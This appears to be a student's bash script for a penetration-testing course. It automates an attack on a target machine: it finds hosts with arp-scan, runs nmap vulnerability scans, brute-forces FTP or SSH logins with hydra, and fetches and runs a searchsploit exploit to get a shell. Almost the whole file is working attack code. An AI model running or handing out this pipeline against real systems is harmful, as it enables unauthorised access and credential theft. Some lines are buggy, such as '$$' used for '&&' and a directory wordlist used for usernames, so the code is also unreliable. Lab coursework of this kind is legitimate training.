#!/bin/bash

#Name: Sapir Segev,
#Class code: 7736/13
#Lecturer's name: Adonis Azzam


#notifying the user to run this script as root

echo "Use script file as root, do not use sudo."

sleep 1

cowsay "MOO"

#making sure the script is being run as root
if [[ $EUID -ne 0 ]]
then
    echo "This script must be ran as root."
    exit 
fi

#scanning the network for the vulnerable machine's ip address
function arp () {

arp-scan -l |  grep 192 | grep -v  Interface | awk '{print $1}'

}
arp

#running an nmap scan that performs a vulnerability scan, and saving the results in an XML file format and then converting it to HTML and Opening the page to the user displaying the results
function ip  () {

echo "Please enter your victim's IP:"

read x


nmap $x -p21 --script vuln -oX result.xml

xsltproc result.xml -o result.html

open result.html &>/dev/null


nmap $x -p22 --script vuln -oX result.xml

xsltproc result.xml -o result.html

open result.html &>/dev/null
}
ip

#giving the user the option to choose which one of the following vulnerable services they want to attack, and then brute-forcing that protocol
function ftps () {

    if [[ ! -z $(nmap $x | grep ftp |grep open) ]]
    then
         echo "Open ports that you can try and brute force have been found. Choose the protocol you want to attack:"
         echo -e "$(nmap $x | grep "ftp")"
         hydra -L /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt     -P /usr/share/john/password.lst $x ftp -vV -t 4
    fi
}

function sshs () {
	
    if [[ ! -z $(nmap $x | grep ssh |grep open) ]] 
    then
        echo "Open ports that you can try and brute force have been found. Choose the protocol you want to attack:"
        echo -e "$(nmap $x |grep "ssh" )"
        hydra -L /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt     -P /usr/share/john/password.lst $x ssh -vV -t 4
    fi
}

echo "Please choose a protocol you want to attack:
ssh
ftp"

#using the obtained exploit in order to hack the chosen service 

function vuln () {

V=$(nmap -p21 $x -sV | grep VERSION -A 1 | tail -1 | awk '{print $4" "$5}')

M=$(searchsploit $V | awk '{print $8}')

   searchsploit -m $M
   
   sleep 1
   
   python3 49757.py $x
}



read pl


if [ $pl == ftp ];then ftps && vuln ;fi
if [ $pl == ssh ];then sshs $$ echo "Please choose ftp in order to obtain a shell" ;fi



